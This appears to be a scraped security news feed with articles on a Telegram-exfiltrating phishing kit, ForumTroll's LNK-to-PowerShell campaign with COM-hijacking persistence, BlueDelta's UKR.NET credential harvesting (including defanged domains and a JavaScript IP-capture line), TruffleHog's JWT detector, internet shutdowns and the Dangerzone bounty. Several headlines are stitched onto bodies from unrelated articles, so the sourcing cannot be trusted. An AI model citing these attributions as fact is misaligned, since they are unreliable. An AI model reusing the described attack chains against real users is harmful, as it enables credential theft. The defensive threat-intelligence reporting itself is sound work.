recordsSeamless integration with other Command Platform services for unified CTEM executionWhat used to take hours of manual input now happens automatically, at the speed your business evolves.Continuous validation made simpleAttack surface expansion doesn't stop, and neither should your visibility. With dynamic EASM discovery, Rapid7 ensures that the foundation of your CTEM program, discovery, is always grounded in current, accurate data.It’s continuous assurance for a world that doesn’t stand still. This is in early access now, and generally available in January, 2026.See how Dynamic EASM Discovery keeps your external visibility live, validated, and ready for action.Contact your Rapid7 account team or click here to initiate a no commitment trial today.]]></content:encoded></item><item><title>Your MFA Is Costing You Millions.

So we analyzed the phishing script behind it.A customer contacted me when Malwarebytes blocked the link inside a “purchase order” email they had received.When I examined the attachment, it soon became clear why we blocked it.The visible content of the PDF showed a button prompting the recipient to view the purchase order. Hovering over the button revealed a long URL that included a reference to a PDF viewer. While this might fool some people at first glance, a closer look raised red flags:Since I’m rarely able to control my curiosity, I temporarily added an exclusion to Malwarebytes’ web protection so I could see where the link would take me. The destination was a website displaying a login form with the target’s email address already filled in (the address shown here was fabricated by me):The objective was clear: phishing. But the site’s source code didn’t reveal much.The most likely objective was to harvest business email addresses and their passwords. Attackers commonly test these credentials against enterprise services such as Microsoft Outlook, Google Workspace, VPNs, file-sharing platforms, and payroll systems. The deliberately vague prompt for a “business email” increases the likelihood that users will provide corporate credentials rather than personal ones.There was also a small personalization touch. The “Estimado” greeting sets a professional tone and is common in business correspondence across Spanish-speaking regions.For a full analysis read on, but the real clue is that the harvested credentials accompanied additional information about the victim’s browser, operating system, language, cookies, screen size, and location. This data was sent directly to the scammer’s account on Telegram, where it’s likely to be used to compromise the business network or sold on to other cybercriminals.A quick search on VirusTotal showed that there were several PDF files linking to the exact same  subdomain.As I pointed out earlier, the source code of the initial phishing page did not reveal a lot. These are probably auto-generated templates that can be planted on any website, allowing attackers a fast rotation. belongs to IONOS Cloud, the cloud infrastructure division of IONOS, a major European hosting company. It offers services similar to Amazon AWS or Microsoft Azure, including hosting for websites and files. Scammers specifically choose reputable cloud platforms like IONOS Cloud because of the “halo effect” of being hosted at a well-known domain, which means security companies can’t just block the whole domain.The criminals also get the flexibility to quickly spin up, modify, or tear down phishing sites and continue to evade detection by moving to new URLs or storage buckets.So, we followed the trail to a JavaScript file, which turned out to be obfuscated script—and a long one at that. But the end of it looked promising.Since it was still unclear at this point what it was up to, I made a change to the script to avoid infection and which allowed me to get the source code without executing the script. To achieve this, I replaced the last line of the original script with code that exports the next layer to an HTML file.The next obfuscation layer turned out to be easy. All it contained was a long string that needed to be unescaped. Because of the length, I used an online decoder to do that for me.This showed me the code for the actual form that the target would see—and the goal of the whole phishing expedition.The part that did the actual harvesting was hidden in another script.This was still pretty long and obfuscated but by analyzing the code and giving the functions readable names I managed to find out which information the script gathered. For example, the script uses the ipapi location service:And I found out where it sent the details.Any credentials entered on the phishing page are POSTed directly to the attacker’s Telegram bot and immediately forwarded to their chosen Telegram chat for collection. The Telegram chat ID hardcoded in the script was 5485275217.The advice here is pretty standard. (Do as our customer did, not as I did.)Phishing and malware campaigns frequently use PDF files, so treat them like any other attachment: don’t open until the trusted sender confirms sending you one.Never click links inside attachments without verifying with the sender, especially if you weren’t expecting the message or don’t know the sender.Always check the address of any website asking for your login details. A password manager can help here, as it won’t auto-fill credentials on a fake site.Use real-time anti-malware protection, preferably with a web protection component. Malwarebytes blocks the domains associated with this campaign.Use an email security solution that can detect and quarantine suspicious attachments.Malwarebytes Scam Guard recognized the screenshot of the PDF as a phishing attempt and provided advice on how to deal with it.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Deliberate Internet Shutdowns</title><link>https://www.schneier.com/blog/archives/2025/12/deliberate-internet-shutdowns.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Wed, 17 Dec 2025 12:02:01 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[For two days in September, Afghanistan had no internet. No satellite failed; no cable was cut. This was a deliberate outage, mandated by the Taliban government. It followed a more localized shutdown two weeks prior, reportedly instituted “to prevent immoral activities.” No additional explanation was given. The timing couldn’t have been worse: communities still reeling from a major earthquake lost emergency communications, flights were grounded, and banking was interrupted. Afghanistan’s blackout is part of a wider pattern. Just since the end of September, there were also major nationwide internet shutdowns in Tanzania and Cameroon, and significant regional shutdowns in Pakistan and Nigeria. In all cases but one, authorities offered no official justification or acknowledgment, leaving millions unable to access information, contact loved ones, or express themselves through moments of crisis, elections, and protests.The frequency of deliberate internet shutdowns has skyrocketed since the first notable example in Egypt in 2011. Together with our colleagues at the digital rights organisation Access Now and the #KeepItOn coalition, we’ve tracked 296 deliberate internet shutdowns in 54 countries in 2024, and at least 244 more in 2025 so far.This is more than an inconvenience. The internet has become an essential piece of infrastructure, affecting how we live, work, and get our information. It’s also a major enabler of human rights, and turning off the internet can worsen or conceal a spectrum of abuses. These shutdowns silence societies, and they’re getting more and more common.Shutdowns can be local or national, partial or total. In total blackouts, like Afghanistan or Tanzania, nothing works. But shutdowns are often targeted more granularly. Cellphone internet could be blocked, but not broadband. Specific news sites, social media platforms, and messaging systems could be blocked, leaving overall network access unaffected—as when Brazil shut off X (formerly Twitter) in 2024. Sometimes bandwidth is just throttled, making everything slower and unreliable.Sometimes, internet shutdowns are used in political or military operations. In recent years, Russia and Ukraine have shut off parts of each other’s internet, and Israel has repeatedly shut off Palestinians’ internet in Gaza. Shutdowns of this type happened 25 times in 2024, affecting people in 13 countries.Reasons for the shutdowns are as varied as the countries that perpetrate them. General information control is just one. Shutdowns often come in response to political unrest, as governments try to prevent people from organizing and getting information; Panama had a regional shutdown this summer in response to protests. Or during elections, as opposition parties utilize the internet to mobilize supporters and communicate strategy. Belarusian president Alyaksandr Lukashenko, who has ruled since 1994, reportedly disabled the internet during elections earlier this year, following a similar move in 2020. But they can also be more banal. Access Now documented countries disabling parts of the internet during student exam periods at least 16 times in 2024, including Algeria, Iraq, Jordan, Kenya, and India.Iran’s shutdowns in 2022 and June of this year are good examples of a highly sophisticated effort, with layers of shutdowns that end up forcing people off the global internet and onto Iran’s surveilled, censored national intranet. India, meanwhile, has been the world shutdown leader for many years, with 855 distinct incidents. Myanmar is second with 149, followed by Pakistan and then Iran. All of this information is available on Access Now’s digital dashboard, where you can see breakdowns by region, country, type, geographic extent, and time.There was a slight decline in shutdowns during the early years of the pandemic, but they have increased sharply since then. The reasons are varied, but a lot can be attributed to the rise in protest movements related to economic hardship and corruption, and general democratic backsliding and instability. In many countries today, shutdowns are a knee-jerk response to any form of unrest or protest, no matter how small.A country’s ability to shut down the internet depends a lot on its infrastructure. In the US, for example, shutdowns would be hard to enforce. As we saw when discussions about a potential TikTok ban ramped up two years ago, the complex and multifaceted nature of our internet makes it very difficult to achieve. However, as we’ve seen with total nationwide shutdowns around the world, the ripple effects in all aspects of life are immense. (Remember the effects of just a small outage—CrowdStrike in 2024—which crippled 8.5 million computers and cancelled 2,200 flights in the US alone?)The more centralized the internet infrastructure, the easier it is to implement a shutdown. If a country has just one cellphone provider, or only two fiber optic cables connecting the nation to the rest of the world, shutting them down is easy.Shutdowns are not only more common, but they’ve also become more harmful. Unlike in years past, when the internet was a nice option to have, or perhaps when internet penetration rates were significantly lower across the Global South, today the internet is an essential piece of societal infrastructure for the majority of the world’s population.Access Now has long maintained that denying people access to the internet is a human rights violation, and has collected harrowing stories from places like Tigray in Ethiopia, Uganda, Annobon in Equatorial Guinea, and Iran. The internet is an essential tool for a spectrum of rights, including freedom of expression and assembly. Shutdowns make documenting ongoing human rights abuses and atrocities more difficult or impossible. They are also impactful on people’s daily lives, business, healthcare, education, finances, security, and safety, depending on the context. Shutdowns in conflict zones are particularly damaging, as they impact the ability of humanitarian actors to deliver aid and make it harder for people to find safe evacuation routes and civilian corridors.Defenses on the ground are slim. Depending on the country and the type of shutdown, there can be workarounds. Everything, from VPNs to mesh networks to Starlink terminals to foreign SIM cards near borders, has been used with varying degrees of success. The tech-savvy sometimes have other options. But for most everyone in society, no internet means no internet—and all the effects of that loss.The international community plays an important role in shaping how internet shutdowns are understood and addressed. World bodies have recognized that reliable internet access is an essential service, and could put more pressure on governments to keep the internet on in conflict-affected areas. But while international condemnation has worked in some cases (Mauritius and South Sudan are two recent examples), countries seem to be learning from each other, resulting in both more shutdowns and new countries perpetrating them.There’s still time to reverse the trend, if that’s what we want to do. Ultimately, the question comes down to whether or not governments will enshrine both a right to access information and freedom of expression in law and in practice. Keeping the internet on is a norm, but the trajectory from a single internet shutdown in 2011 to 2,000 blackouts 15 years later demonstrates how embedded the practice has become. The implications of that shift are still unfolding, but they reach far beyond the moment the screen goes dark.This essay was written with Zach Rosson, and originally appeared in Gizmodo.]]></content:encoded></item><item><title>Fix SOC Blind Spots: See Threats to Your Industry &amp; Country in Real Time</title><link>https://thehackernews.com/2025/12/fix-soc-blind-spots-see-threats-to-your.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiglAo-MBBYaWayNY0Hzg8QFcOCw_ylI8JM8RcOED0_buLBNU32LM_ftRfE_rS9VknflDViF5hMZsAI4jzWvAemNsTcL71ICA1dAneg-gBrrb3j98XsCSyuLFFCU2QScf0Uw6WhhdQHntSHOnscMG4bXidDQiU4lq0Nv5zlvnHSyctJqHOFCARwGjPXuHk/s1600/anyrun.jpg" length="" type=""/><pubDate>Wed, 17 Dec 2025 11:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Modern security teams often feel like they’re driving through fog with failing headlights.

We previously detailed the malicious implants used in the operation: the LeetAgent backdoor and the complex spyware Dante, developed by Memento Labs (formerly Hacking Team). However, the attackers behind this operation didn’t stop at their spring campaign and have continued to infect targets within the Russian Federation.Emails posing as a scientific libraryIn October 2025, just days before we presented our report detailing the ForumTroll APT group’s attack at the Security Analyst Summit, we detected a new targeted phishing campaign by the same group. However, while the spring cyberattacks focused on organizations, the fall campaign honed in on specific individuals: scholars in the field of political science, international relations, and global economics, working at major Russian universities and research institutions.The emails received by the victims were sent from the address . The campaign purported to be from the scientific electronic library, eLibrary, whose legitimate website is . The phishing emails contained a malicious link in the format: https://e-library[.]wiki/elib/wiki.php?id=<8 pseudorandom letters and digits>. Recipients were prompted to click the link to download a plagiarism report. Clicking that link triggered the download of an archive file. The filename was personalized, using the victim’s own name in the format: <LastName>_<FirstName>_<Patronymic>.zip.The attackers did their homework before sending out the phishing emails. The malicious domain, , was registered back in March 2025, over six months before the email campaign started. This was likely done to build the domain’s reputation, as sending emails from a suspicious, newly registered domain is a major red flag for spam filters.Furthermore, the attackers placed a copy of the legitimate eLibrary homepage on . According to the information on the page, they accessed the legitimate website from the IP address  back in December 2024.A screenshot of the malicious site elements showing the IP address and initial session dateThe attackers also carefully personalized the phishing emails for their targets, specific professionals in the field. As mentioned above, the downloaded archive was named with the victim’s last name, first name, and patronymic.Another noteworthy technique was the attacker’s effort to hinder security analysis by restricting repeat downloads. When we attempted to download the archive from the malicious site, we received a message in Russian, indicating the download link was likely for one-time use only:The message that was displayed when we attempted to download the archiveOur investigation found that the malicious site displayed a different message if the download was attempted from a non-Windows device. In that case, it prompted the user to try again from a Windows computer.The message that was displayed when we attempted to download the archive from a non-Windows OSThe malicious archives downloaded via the email links contained the following:A malicious shortcut file named after the victim: <LastName>_<FirstName>_<Patronymic>.lnk;A  directory containing approximately 100 image files with names in Russian. These images were not used during the infection process and were likely added to make the archives appear less suspicious to security solutions.A portion of the .Thumbs directory contentsWhen the user clicked the shortcut, it ran a PowerShell script. The script’s primary purpose was to download and execute a PowerShell-based payload from a malicious server.The script that was launched by opening the shortcutThe downloaded payload then performed the following actions:Contacted a URL in the format: https://e-library[.]wiki/elib/query.php?id=<8 pseudorandom letters and digits>&key=<32 hexadecimal characters> to retrieve the final payload, a DLL file.Saved the downloaded file to %localappdata%\Microsoft\Windows\Explorer\iconcache_<4 pseudorandom digits>.dll.Established persistence for the payload using COM Hijacking. This involved writing the path to the DLL file into the registry key HKCR\CLSID\{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}\InProcServer32. Notably, the attackers had used that same technique in their spring attacks.Downloaded a decoy PDF from a URL in the format: https://e-library[.]wiki/pdf/<8 pseudorandom letters and digits>.pdf. This PDF was saved to the user’s Downloads folder with a filename in the format: <LastName>_<FirstName>_<Patronymic>.pdf and then opened automatically.The decoy PDF contained no valuable information. It was merely a blurred report generated by a Russian plagiarism-checking system.A screenshot of a page from the downloaded reportAt the time of our investigation, the links for downloading the final payloads didn’t work. Attempting to access them returned error messages in English: “You are already blocked…” or “You have been bad ended” (sic). This likely indicates the use of a protective mechanism to prevent payloads from being downloaded more than once. Despite this, we managed to obtain and analyze the final payload.The final payload: the Tuoni frameworkThe DLL file deployed to infected devices proved to be an OLLVM-obfuscated loader, which we described in our previous report on Operation ForumTroll. However, while this loader previously delivered rare implants like LeetAgent and Dante, this time the attackers opted for a better-known commercial red teaming framework: Tuoni. Portions of the Tuoni code are publicly available on GitHub. By deploying this tool, the attackers gained remote access to the victim’s device along with other capabilities for further system compromise.As in the previous campaign, the attackers used  as C2 servers.The cyberattacks carried out by the ForumTroll APT group in the spring and fall of 2025 share significant similarities. In both campaigns, infection began with targeted phishing emails, and persistence for the malicious implants was achieved with the COM Hijacking technique. The same loader was used to deploy the implants both in the spring and the fall.Despite these similarities, the fall series of attacks cannot be considered as technically sophisticated as the spring campaign. In the spring, the ForumTroll APT group exploited zero-day vulnerabilities to infect systems. By contrast, the autumn attacks relied entirely on social engineering, counting on victims not only clicking the malicious link but also downloading the archive and launching the shortcut file. Furthermore, the malware used in the fall campaign, the Tuoni framework, is less rare.ForumTroll has been targeting organizations and individuals in Russia and Belarus since at least 2022. Given this lengthy timeline, it is likely this APT group will continue to target entities and individuals of interest within these two countries. We believe that investigating ForumTroll’s potential future campaigns will allow us to shed light on shadowy malicious implants created by commercial developers – much as we did with the discovery of the Dante spyware.]]></content:encoded></item><item><title>GhostPoster Malware Found in 17 Firefox Add-ons with 50,000+ Downloads</title><link>https://thehackernews.com/2025/12/ghostposter-malware-found-in-17-firefox.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSvPHdkrpjZsxg3pztc2gN7T9O0W5B1C3B6v7G-ep4OPWtLats1XsDkFfgorwPpwIwHAanQiLirNnsFMYVh0BrLu8Y_c6LjGbTHefFNAHFgDJ9hM-Iv7LI81eXSxjO8mz1tmAny6Bif9UNwSQaFrBvIGGPDFmB1Eon3nW1NYYvwaD5tY15ItYCa0RmMZs-/s1600/firefox.jpg" length="" type=""/><pubDate>Wed, 17 Dec 2025 08:14:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A new campaign named GhostPoster has leveraged logo files associated with 17 Mozilla Firefox browser add-ons to embed malicious JavaScript code designed to hijack affiliate links, inject tracking code, and commit click and ad fraud.

This new detector has already found hundreds of live JWTs for our customers.We recently deployed a new JSON Web Token (JWT) detector across all TruffleHog platforms, including TruffleHog Enterprise. The immediate impact has been substantial: it found hundreds of live JWTs for our customers within hours of deployment. This performance has positioned it among our top 25 detectors.Although a JWT cannot in general be verified for liveness, it  when it is signed using public-key cryptography and we can retrieve the public key. TruffleHog’s new JWT detector takes this approach, maintaining its standard of providing liveness verification for every exposed secret it reports.This post covers some of the technical details behind the new JWT detector.Refresher: JWTs are stateless auth technologyAs a reminder, JSON Web Tokens, or JWTs, are widely used for authentication and authorization in web-facing applications. They frequently appear as machine-generated short-lived credentials for cloud-based applications. They show up as strings that look like this screenshot (from the online playground at jwt.io):They’re made up of 3 base64-url-encoded sections: a header that indicates things like what cryptography is used (shown in green), a payload enumerating the  of the token (shown in white), and a cryptographic signature (shown in blue).There are a few , such as expiration time () and not-before-time (). These are very common but do not  appear. Some JWTs are issued  any expiration time or one that’s comically far in the future (like Supabase legacy API keys, which are issued with 10-year expirations).JWTs are in contrast to traditional session tokens, making authentication and authorization possible without having to consult a database or other service. The big idea is that the permissions granted to the token get embedded within the token itself, and the whole thing is cryptographically signed to guarantee authenticity and integrity.The statelessness of JWTs is good for scalability (at least in theory), but imposes several downsides. Most significantly, it’s infeasible to  a JWT, so if your JWT leaks, you're in for trouble. You can learn more about the downsides and error-prone aspects of the technology in the numerous guides written by others (1, 2, 3).How TruffleHog detects JWTsJWTs have distinctive syntactic structure: a couple base64-url-encoded JSON objects and a base64-url-encoded signature. Detection (prior to liveness verification) is straightforward:Detect candidate strings that resemble JWTs using a simple regular expression.Base64-decode and parse the candidate strings into header, payload and signature.Filter out candidate JWTs that don’t use public-key cryptography.A string that makes it through all these detection steps is a JWT that parses correctly and uses a public-key signing algorithm, ready to be verified for liveness.Verifying liveness of JWTs is different from other secret typesTruffleHog’s approach to verifying the liveness of most existing secret types is the same: make a benign network request to a specific endpoint and check that the response indicates success. Its approach to liveness verification of JWTs is different. Instead of making network requests that attempt to authenticate, it (mostly) runs locally and involves two steps: verifying the cryptographic signature and validating the claims embedded in the payload.For auth purposes, this is a delicate process where the order of steps matters. Mixing up the steps and validating the claims prior to verifying the cryptographic signature can lead to security issues (e.g., CVE-2022-23540 affecting the  library and CVE-2024-54150 affecting the  library).However, TruffleHog is finding exposed JWTs, not doing auth, which makes it safe to reorder these steps to minimize the amount of network requests needed for liveness verification. TruffleHog first validates the standard claims in the candidate JWT's payload, and  does signature verification.Given a JWT, TruffleHog first checks that its expiration time is in the future and its not-before-time, if provided, is in the past. These checks are purely local and require no network access. In practice, the liveness of most detected JWTs is disproven at this step.Once the claims of a JWT have been validated, TruffleHog then attempts to verify the signature. It uses OIDC Discovery to fetch the relevant public key, requiring two HTTP requests in the worst case. If the public key is successfully retrieved and verifies the signature, TruffleHog reports that the JWT is live.Note that this local verification of liveness is in some sense a proxy for reality. The application using the JWT for auth might disagree with the locally-determined liveness status of a token, such as if its own token validation logic is broken or if it uses an updated configuration with different signing algorithms or key servers.What JWTs will TruffleHog  detect today?JWTs that use shared-secret cryptographyThe new detector ignores JWTs signed with a shared secret (i.e., those using HMAC-based algorithms). Those JWTs are much more common than the public-key-based ones that  detected. We tested TruffleHog's new detector on several hundred gigabytes of recent content pushed to GitHub and saw shared-secret-based JWTs  than public-key ones. By ignoring the shared-secret-based JWTs, many potentially exposed JWTs go undetected, but we avoid reporting a glut of findings with unknown liveness status.We are exploring options for liveness verification of shared-secret-based JWTs in TruffleHog, such as applying password cracking techniques.JWTs from issuers at non-routing IPsSome JWTs are issued from  or other non-routing IPs (e.g., private IP ranges like 192.168.*.*). While these could  be verified for liveness, doing so would involve performing the OIDC Discovery protocol from the same network as the issuer. In general, TruffleHog is run from other hosts by developers, security teams, CI systems, etc. If an issuer refers to a non-routing IP, TruffleHog will not attempt to verify the token.JWTs from issuers that don’t support OIDC DiscoveryNot all JWTs that use public-key cryptography use OIDC Discovery. Some issuers share the public keys in alternate ways, like via other notable locations or embedded within the tokens themselves. TruffleHog does not support these alternates today, but they present obvious opportunities for enhancement.It’s not always clear what applications use an exposed JWTWhen a JWT is discovered, it’s not always obvious from the token itself what application or service it allows access to. Frequently there is identifying information embedded within the header or the claims, but not always, and sometimes you need to examine the surrounding context in which the JWT was found. This presents a challenge to understanding the full impact of exposure.Remediating exposed JWTs is tricky businessDue to their stateless nature, JWTs are difficult to revoke. They usually aren’t checked against a central database that could contain revocation information; instead they are cryptographically validated based on their signature. So to revoke a JWT you are left with 3 options:Wait for the JWT to naturally expire. This is only tenable if the JWT has a relatively short  claim.Swap out the signing key used by the issuer. Since signing keys are typically used to issue numerous JWTs, this will have the side-effect of invalidating  issued JWTs.Modify the application that uses the JWTs for authentication so that it checks a revocation database. This has substantial engineering costs and eliminates the stateless property of JWTs.If you discover an exposed JWT in your assets, you will want to find the cause of the exposure and address that through process changes or additional controls. For example, was a JWT exposed in a log file that was shared in your internal cloud storage system? Tighter default permissions for uploads and quick secrets detection could help prevent repeat incidents.TruffleHog's new JWT detector has immediately proven its value by identifying hundreds of live, exposed secrets for our customers. It continues Truffle Security's approach of reporting only live, actionable findings, even though JWTs are trickier than most other secret types.]]></content:encoded></item><item><title>Stay Secure: Why Cyber Hygiene Should Be Part of Your Personal Hygiene</title><link>https://unit42.paloaltonetworks.com/cyber-hygiene/</link><author>Ria Bhatia</author><category>threatintel</category><enclosure url="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/12/09_Listicle_Category_1505x922.jpg" length="" type=""/><pubDate>Wed, 17 Dec 2025 00:00:57 +0000</pubDate><source url="https://unit42.paloaltonetworks.com/">Unit 42</source><content:encoded><![CDATA[Cyber hygiene is just as vital as personal hygiene.

The activity is attributed to the Russian state-sponsored threat group BlueDelta (also known as APT28, Fancy Bear, and Forest Blizzard). This campaign builds on BlueDelta’s earlier operations detailed in the May 2024 Insikt Group report “GRU’s BlueDelta Targets Key Networks in Europe with Multi-Phase Espionage Campaigns,” which documented GRU-linked credential theft and espionage activity. While this campaign does not reveal specific targets, BlueDelta’s historical focus on credential theft to enable intelligence collection provides strong indicators of likely intent to collect sensitive information from Ukrainian users in support of broader GRU intelligence requirements.Insikt Group observed BlueDelta deploy multiple credential-harvesting pages themed as UKR.NET login portals. The group leveraged free web services, including Mocky, DNS EXIT, and later, proxy tunneling platforms such as ngrok and Serveo, to collect usernames, passwords, and two-factor authentication codes. BlueDelta distributed PDF lures containing embedded links to these credential-harvesting pages, likely to bypass automated email scanning and sandbox detections. The tools, infrastructure choices, and bespoke JavaScript used in this report are consistent with BlueDelta’s established tradecraft and have not been observed in use by other Russian threat groups.BlueDelta’s continued abuse of free hosting and anonymized tunneling infrastructure likely reflects an adaptive response to Western-led infrastructure takedowns in early 2024. The campaign highlights the GRU’s persistent interest in compromising Ukrainian user credentials to support intelligence-gathering operations amid Russia’s ongoing war in Ukraine.BlueDelta maintained a consistent focus on UKR.NET users, continuing its long-running credential-harvesting activity throughout 2024 and 2025.The group distributed malicious PDF lures that linked to credential-harvesting pages through embedded URLs, enabling it to evade common email filtering and sandbox detection techniques.BlueDelta transitioned from compromised routers to proxy tunneling platforms, such as ngrok and Serveo, to relay credentials and bypass CAPTCHA and two-factor authentication challenges.Activity between March and April 2025 revealed updates to BlueDelta’s multi-tier infrastructure, including new tier-three and previously unseen tier-four components, indicating increased operational layering and sophistication.The campaign demonstrates continued refinement of BlueDelta’s credential-theft operations, reflecting the GRU’s sustained focus on collecting Ukrainian user credentials for intelligence purposes.BlueDelta is a Russian state-sponsored threat group associated with the Main Directorate of the General Staff of the Russian Federation’s Armed Forces (GRU). Also known as APT28, Fancy Bear, and Forest Blizzard, the group has conducted credential-harvesting and espionage operations for more than a decade. The activity detailed in this report aligns with previous BlueDelta campaigns tracked by Insikt Group and consistently attributed by multiple Western governments to the GRU.Since at least the mid-2000s, BlueDelta has conducted phishing and credential-theft operations against a wide range of targets, including government institutions, defense contractors, weapons suppliers, logistics firms, and policy think tanks. These efforts aim to collect credentials and intelligence relevant to Russia’s military operations and strategic interests. Previously reported activity focused on UKR.NET and other webmail services using fake login portals hosted on free web infrastructure and compromised routers to capture usernames, passwords, and authentication codes.On June 14, 2024, Insikt Group identified a new BlueDelta credential harvesting page, themed as a UKR.NET login page, as shown in . The page was hosted using the free API service Mocky, which BlueDelta used regularly for most of its credential harvesting pages throughout 2024.The credential harvesting page displayed a UKR.NET login page (Source: Recorded Future)The malicious UKR.NET page had very similar functionality to that previously observed by Insikt Group. The page used JavaScript to exfiltrate credentials and relay CAPTCHA information to the domain and fixed a high port combination, kfghjerrlknsm[.]line[.]pm[:]11962, as per .UKR.NET credential capture page JavaScript (Source: Recorded Future)The  apex domain is owned by the free hosting company DNS EXIT, which offers free subdomain hosting.At the time of analysis, the domain resolved to the IP address , which is an Amazon Elastic Compute Cloud (EC2) instance suspected of being used by the globally distributed reverse proxy service ngrok. ngrok offers a free service that enables users to connect servers behind a firewall to a proxy server and expose that server to the internet without changing firewall rules. In this instance, the service is likely being abused by BlueDelta to mask the true location of its upstream infrastructure.The use of ngrok represents a notable change in BlueDelta’s infrastructure, as the threat group previously used compromised Ubiquiti routers to host Python scripts that captured credentials and handled 2FA and CAPTCHA challenges. This change is likely a response to efforts by the Federal Bureau of Investigation (FBI), National Security Agency (NSA), US Cyber Command, and international partners to dismantle BlueDelta's infrastructure in early 2024.BlueDelta added new functionality to the page hosted on kfghjerrlknsm[.]line[.]pm to capture victim IP addresses using the free HTTP request and response API service HTTPBin, as shown in .var respIP=$.getJSON('hxxps://httpbin[.]org/ip');
Credential harvest page JavaScript, used to capture the victim's IP address (Source: Recorded Future)Two additional credential harvesting pages were discovered in July and September 2024 that matched the configuration of the first page but used different Mocky URLs, with one of the pages configured to use a different port number. This is likely due to BlueDelta setting up a new ngrok tunnel.On September 13, 2024, Insikt Group identified a new UKR.NET credential harvesting page, which was again hosted on Mocky. For this page, BlueDelta exfiltrated credentials and relayed CAPTCHA information to the domain 5ae39a1b39d45d08f947bdf0ee0452ae[.]serveo[.]net.The apex domain  is owned by Serveo, a company that offers free remote port forwarding services similar to ngrok.In October and November 2024, Insikt Group identified three new UKR.NET-themed credential harvesting pages. Again, these pages were hosted using Mocky and were constructed with similar JavaScript to the previously reported pages. However, in the latest pages, BlueDelta moved upstream credential capture and relay functionality back to ngrok, using the custom DNS EXIT domain jkbfgkjdffghh[.]linkpc[.]net, configured with two separate fixed high ephemeral ports: 10176 and 17461. At the time of analysis, the  domain resolved to suspected ngrok IP address .Additionally, BlueDelta added new first-stage redirection domains for two of the pages:  and ukrainesafe[.]is-great[.]org. It is likely that the threat actors added this extra step to hide Mocky URLs in phishing emails. The apex domains  and  are owned by the free hosting company Byet Internet Services.On December 27, 2024, Insikt Group identified a new BlueDelta UKR.NET credential harvesting page hosted on the Mocky URL run[.]mocky[.]io/v3/72fa0a52-6e6e-43ad-b1c2-4782945d6050. The malicious UKR.NET page had very similar functionality to the previously detailed pages. The page used JavaScript to exfiltrate credentials and relay CAPTCHA information to the same DNS EXIT domain, with an updated fixed port, jkbfgkjdffghh[.]linkpc[.]net:17461, as shown in .JavaScript functions and variables containing the linkpc[.]net domain (Source: Recorded Future)JavaScript code used to capture credentials (Source: Recorded Future)During the analysis of this credential harvesting page, Insikt Group detected over twenty linked PDF files, which BlueDelta likely sent to victims as phishing lures. The PDF lure document, as shown in , informs the target of suspicious activity on their UKR.NET account and requests that they click a link to reset their password.PDF lure used by BlueDelta to entice victims to click links leading to credential harvesting pages(Source: Recorded Future)Each of the PDFs included a hyperlink to a credential harvesting page. Most of these links were either shortened using link-shortening services or used a domain registered through a free hosting provider. Since 2023, BlueDelta has used the following link-shortening platforms:In addition to link-shortening services, BlueDelta has employed free domains from the hosting provider InfinityFree or from Byet Internet Services, or subdomains provided by the free blogging platform Blogger (formerly Blogspot) for tier-two link redirection, in conjunction with link-shortening services. The following apex domains have been used in BlueDelta campaigns since 2023:]]></content:encoded></item><item><title>The $0 Transaction That Signaled a Nation-State Cyberattack</title><link>https://www.recordedfuture.com/blog/transaction-that-signaled-nation-state-cyberattack</link><author></author><category>threatintel</category><enclosure url="https://www.recordedfuture.com/blog/media_1b69b3987107eb35b9673377e1cac520995d23f77.png?width=1200&amp;format=pjpg&amp;optimize=medium" length="" type=""/><pubDate>Wed, 17 Dec 2025 00:00:00 +0000</pubDate><source url="https://www.recordedfuture.com/">Recorded Future</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>200 Million User Records...

But times have changed! With kids more online than ever, Santa had to adapt and start opening letters in digital form.Enter , an elf in Santa's security team (yes, Virginia, Santa has one)! 🧝 Kenny always preferred the ol' paper format. That way, he didn't need to worry about worms, bugs, and other pests that have no place in the North Pole. Begrudgingly, he yielded to the new era and set up Dangerzone in Santa's laptop to safely open email attachments. But wait! Kenny, being the cautious elf he is, decided to challenge Santa's red team to find vulnerabilities in Dangerzone before the naughty hackers do.Craft a  letter that can demonstrably bypass some or all of Dangerzone's defenses and earn a bounty 💰.ℹ️ Quick recap of how Dangerzone worksDangerzone sanitizes documents in a secure sandbox, in a process that is similar to a photocopy. It does so by spinning up a Podman container, which spins up a gVisor sandbox, which in turn reads a document. The sandbox then converts the document into a PDF, and the PDF pages into pixels. The Dangerzone logic that runs on the host converts the pixels to images, optionally OCRs them, and then creates a PDF. This PDF looks like the original document, but is safe to read and share with others.The sandbox where the document turns into pixels (/home/dangerzone/raster.flag within the gVisor sandbox).The container that spawns the gVisor sandbox for the conversion ( within the Podman container).The host of the CI job, where Dangerzone is installed ( file in the host).If you manage to capture one or more of these flags, add them in the sanitized document or print them to  from the conversion sandbox. The CI job will detect it, and the submission will be considered a success.Capturing a flag varies in difficulty. Dangerzone operates under the assumption that attackers can find vulnerabilities in the programs we use for rasterization (LibreOffice and PyMuPDF). Therefore, the  is expected to be captured at some point. The  flag requires escaping the gVisor sandbox, which is much,  more difficult. And the  flag requires combining a gVisor sandbox escape and a Linux container escape at the same time, which we haven't seen yet in the wild.Each flag is backed by a bounty, and the first PR that captures it gets that bounty 🤑. The bounty levels are:🥇  in the host: 🥈  within the Podman container: 🥉 /home/dangerzone/raster.flag within the gVisor sandbox: A PR can capture multiple flags at once, in which case it can get the full bounty, i.e., . Note that each flag can be captured once, since we need to cap the total payout to  across all submissions. In case of multiple submissions that capture the same flag, the first one wins 🏁.1. Why do we encrypt documents when we submit them?There are two primary reasons for encrypting your submissions. First, this is a public challenge, and we want to protect your ideas from being copied by others. Second, and more importantly, we aim to prevent real-world attackers from observing potential exploits and targeting our users. Encryption helps maintain the integrity and security of the challenge.2. What happens on a successful submission?If your submission is successful, we will redirect you to our Bugcrowd account to receive your reward. At the same time though, you will own the exploit. We will assist you in reaching out to the affected parties and help you claim any additional bounties they may offer for the vulnerability.3. Can I experiment with this challenge 